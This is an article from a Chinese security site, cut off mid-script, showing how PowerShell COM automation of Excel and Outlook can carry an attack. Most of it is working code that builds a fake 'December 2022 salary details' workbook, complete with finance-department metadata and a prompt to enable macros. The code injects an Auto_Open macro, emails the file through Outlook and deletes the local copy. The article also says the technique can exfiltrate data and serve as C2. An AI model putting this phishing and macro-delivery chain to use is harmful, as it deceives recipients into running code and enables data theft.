---
title: 一种针对Microsoft Office的自动化攻击方式
url: https://www.4hou.com/posts/03Wy
source: 嘶吼 RoarTalk – 回归最本质的信息安全,互联网安全新媒体,4hou.com
date: 2023-02-08
fetch_date: 2025-10-04T05:56:21.415037
---

# 一种针对Microsoft Office的自动化攻击方式

一种针对Microsoft Office的自动化攻击方式 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com

[![](https://www.4hou.com/sihou/images/new4hou/newlogoss.png)](https://www.4hou.com)

* [首页](https://www.4hou.com)
* [企业中心](https://www.4hou.com/corp/newindex)
* [产业研究院](https://www.4hou.com/real-time)

![](https://www.4hou.com/sihou/images/new4hou/search-icon.png)

[投稿](https://www.4hou.com/contribute)

[登录](https://www.4hou.com/login)
  |
[注册](https://www.4hou.com/register)

* 导读 ▾
* [活动](https://www.4hou.com/newticket)
* [专题](https://www.4hou.com/category/special)
* [图谱](https://www.4hou.com/atlas/index)
* [报告](https://www.4hou.com/new-report-info)
* [嘶票](https://www.4hou.com/tickets)
* [嘶货](https://www.4hou.com/shop)
* [企业查询](https://www.4hou.com/corp/new-search-company)
* [招聘](https://www.4hou.com/recruit)![](https://www.4hou.com/sihou/images/1561626446625934.png)

* [新闻](https://www.4hou.com/category/news)
* [行业](https://www.4hou.com/category/industry)
* [趋势](https://www.4hou.com/category/observation)
* [访谈](https://www.4hou.com/category/people)
* [漏洞](https://www.4hou.com/category/vulnerable)
* [WEB安全](https://www.4hou.com/category/web)
* [业务安全](https://www.4hou.com/category/business)
* [系统安全](https://www.4hou.com/category/system)
* [内网渗透](https://www.4hou.com/category/penetration)
* [勒索软件](https://www.4hou.com/category/typ)
* [安全工具](https://www.4hou.com/category/tools)

# 一种针对Microsoft Office的自动化攻击方式

矢安科技
[行业](https://www.4hou.com/category/industry)
2023-02-07 16:35:36

![](https://img.4hou.com/article/%E6%B5%8F%E8%A7%88.png)107467

收藏

导语：目前，很多软件包括Microsoft Office都是通过COM 对象实现的，它们都可以使用PowerShell（或其他语言）COM 对象来完成程序和服务的自动化操作。基于此，如果受害者机器安装了 Microsoft Office ，恶意软件就可以利用 COM 对象对目标主机进行恶意攻击。

**前言**

目前，很多软件包括Microsoft Office都是通过COM 对象实现的，它们都可以使用PowerShell（或其他语言）COM 对象来完成程序和服务的自动化操作。基于此，如果受害者机器安装了 Microsoft Office ，恶意软件就可以利用 COM 对象对目标主机进行恶意攻击。

**自动化 Microsoft Excel的攻击**

1.通过Excel 执行PowerShell。

我们可以使用 New-Object -com 命令创建 Excel 应用程序，然后与返回的对象进行交互。

```
PS C:\> $excel = New-Object -com Excel.Application
PS C:\> $excel.Visible = $true
```

注意：如果要隐藏用户界面，应使用 Visible = $false。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230207/1675755023108706.png "1675754221212693.png")

2.编辑 Excel 文档

下一步可以添加一个 Workbook 并将一些数据写入特定的 Cell.

```
PS C:\> $workbook = $excel.Workbooks.Add()
PS C:\> $cell = $workbook.ActiveSheet.Cells(1,1)
PS C:\> $cell.Value = "Here goes the secret message!"
PS C:\> $workbook.Password = "Test"
```

结果如下所示：

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230207/1675755024118612.png "1675754418851075.png")

3.保存文档

使用 SaveAs 功能保存文件。

```
PS C:\> $workbook.SaveAs("EmbraceTheRed")
```

4.关闭文档

最后，使用 CLose() 关闭 Excel。

```
PS C:\> $workbook.Close()
PS C:\> $excel.Quit()
```

**自动化 Microsoft Outlook 的攻击**

如前所述，Office 的大部分内容都是使用 COM 接口实现的，因此我们也可以实现自动化 Outlook的攻击。例如，为了将创建的 Excel 文档发送出去，攻击者可以使用 Outlook。

```
$to = ""
$subject = "Secret Excel Document"
$content = "Important message attached."
$outlook = New-Object -com Outlook.Application
$mail = $outlook.CreateItem(0)
$mail.Attachments.Add("EmbraceTheRed")
$mail.subject = $subject
$mail.To = $to
$mail.HTMLBody = $content
$mail.Send()
```

使用这些 COM 自动化技术，可以使安装在受感染机器上的现成应用程序来窃取数据，还可以建立完整的 C2 基础设施和消息通信。

**自动化 Microsoft Outlook 发送文档**

将上面的两部分结合，先生成 xls 加入宏之后保存为 xlsm，之后作为附件发送至目标，最后再将本地的 Excel 文件删除。

![1675754646873.jpg](https://img.4hou.com/uploads/ueditor/php/upload/image/20230207/1675755025698444.png "1675754651104700.png")

接收方接收邮件

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230207/1675755026187982.png "1675754662212146.png")

邮件详情

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230207/1675755026130091.png "1675754669736630.png")

打开表格即中招。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230207/1675755027971682.png "1675754678107564.png")

Excel 表格信息，其中最后一次保存者为发送邮件方的主机

![1675754695817.jpg](https://img.4hou.com/uploads/ueditor/php/upload/image/20230207/1675755029236204.png "1675754698930936.png")

**代码**

**powershell write xls**

```
$excel = New-Object -com Excel.Application
$excel.Visible = $false
$workbook = $excel.Workbooks.Add()
$cell = $workbook.ActiveSheet.Cells(1,1)
$cell.Value = "查看工资明细请选择开启宏！"
$workbook.ActiveSheet.Cells(2,1).Value = " 月份 "
$workbook.ActiveSheet.Cells(2,2).Value = " 姓名 "
$workbook.ActiveSheet.Cells(2,3).Value = " 月薪 "
$workbook.ActiveSheet.Cells(2,4).Value = " 餐补 "
$workbook.ActiveSheet.Cells(2,5).Value = " 交补 "
$workbook.ActiveSheet.Cells(2,6).Value = " 出差补助 "
$workbook.ActiveSheet.Cells(2,7).Value = " 通讯费补助 "
$workbook.ActiveSheet.Cells(2,8).Value = " 交通费补助 "
$workbook.ActiveSheet.Cells(2,9).Value = " 笔记本补助 "
$workbook.ActiveSheet.Cells(2,10).Value = " 保密补贴 "
$workbook.ActiveSheet.Cells(2,11).Value = " 试用期导师津贴 "
$workbook.ActiveSheet.Cells(2,12).Value = " 伯乐奖 "
$workbook.ActiveSheet.Cells(2,13).Value = " 入离职不在职扣款 "
$workbook.ActiveSheet.Cells(2,14).Value = " 事假扣款 "
$workbook.ActiveSheet.Cells(2,15).Value = " 病假扣款 "
$workbook.ActiveSheet.Cells(2,16).Value = " 转正/调薪差额 "
$workbook.ActiveSheet.Cells(2,16).Value = " 其他 "
$workbook.ActiveSheet.Cells(2,16).Value = "  超融合奖励 "
$workbook.ActiveSheet.Cells(2,16).Value = " 应发合计 "
$workbook.ActiveSheet.Cells(2,16).Value = "  养老个人 "
$workbook.ActiveSheet.Cells(2,16).Value = " 失业个人 "
$workbook.ActiveSheet.Cells(2,16).Value = " 社保个人补差 "
$workbook.ActiveSheet.Cells(2,16).Value = " 公积金个人 "
$workbook.ActiveSheet.Cells(2,16).Value = " 税率 "
$workbook.ActiveSheet.Cells(2,16).Value = " 个税 "
$workbook.ActiveSheet.Cells(2,16).Value = " 扣除已发超融合奖励 "
$workbook.ActiveSheet.Cells(2,16).Value = " 实发 "
$workbook.ActiveSheet.Cells(2,16).Value = " 累计子女教育 "
$workbook.ActiveSheet.Cells(2,16).Value = " 累计赡养老人 "
$workbook.ActiveSheet.Cells(2,16).Value = " 累计继续教育 "
$workbook.ActiveSheet.Cells(2,16).Value = " 累计住房贷款利息 "
$workbook.ActiveSheet.Cells(2,16).Value = " 累计住房租金 "
$workbook.WorkSheets.item(1).Name = "工资明细"
$workbook.author = "财务部"
$workbook.title = "2022年12月工资明细"
$workbook.subject = "2022年12月工资明细"
$workbook.SaveAs("c:\temp\2022年12月工资明细.xls")
$xl = New-Object -ComObject Excel.Application
$xl.Visible = $false
$xl.DisplayAlerts = $false
$workbook = $xl.Workbooks.Open("c:\temp\2022年12月工资明细.xls")
$xlmodule = $workbook.VBProject.VBComponents.Add(1)
$code = @"
Sub Auto_Open()
Msgbox "You Are Be Hacked!"
End Sub
"@
$xlmodule.CodeModule.AddFromString($code)
$workbook.SaveAs("c:\temp\2022年12月工资明细.xlsm",52)
$workbook.Close()
$excel.Quit()
sleep(1)
del c:\temp\2022年12月工资明细.xls
```

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230207/1675755030116696.png "1675754731168147.png")

**OutLook**

```
$to = "xxxx@qq.com"
$subject = "2022年12月工资明细"
$content = "您好，附件为2022年12月工资明细，请查收，谢谢。"
$outlook = New-Object -com Outlook.Application
$mail = $outlook.CreateItem(0)
$mail.Attachments.Add("c:\temp\2022年12月工资明细.xlsm")
$mail.subject = $subject
$mail.To = $to
$mail.HTMLBody = $content
$mail.Send()
```

**结合**

```
$excel = New-Object -com Excel.Application
$excel.Visible = $false
$workbook = $excel.Workbooks.Add()
$cell = $workbook.ActiveSheet.Cells(1,1)
$cell.Value = "查看工资明细请选择开启宏！"
$workbook.ActiveSheet.Cells(2,1).Value = " 月份 "
$workbook.ActiveSheet.Cells(2,2).Value = " 姓名 "
$workbook.ActiveSheet.Cells(2,3).Value = " 月薪 "
$workbook.ActiveSheet.Cells(2,4).Value = " 餐补 "
$workbook.ActiveSheet.Cells(2,5).Value = " 交补 "
$workbook.ActiveSheet.Cells(2,6).Value = " 出差补助 "
$workbook.ActiveSheet.Cells(2,7).Value = " 通讯费补助 "
$workbook.ActiveSheet.Cells(2,8).Value = " 交通费补助 "
$workbook.ActiveSheet.Cells(2,9).Value = " 笔记本补助 "
$workbook.ActiveSheet.Cells(2,10).Value = " 保密补贴 "
$workbook.ActiveSheet.Cells(2,11).Value = " 试用期导师津贴 "
$workbook.ActiveSheet.Cells(2,12).Value = " 伯乐奖 "
$workbook.ActiveSheet.Cells(2,13).Value = " 入离职不在职扣款 "
$workbook.ActiveSheet.Cells(2,14).Value = " 事假扣款 "
$workbook.ActiveSheet.Cells(2,15).Value = " 病假扣款 "
$workbook.ActiveSheet.Cells(2,16).Value = " 转正/调薪差额 "
$workbook.ActiveSheet.Cells(2,16).Value = " 其他 "
$workbook.ActiveSheet.Cells(2,16).Value = "  超...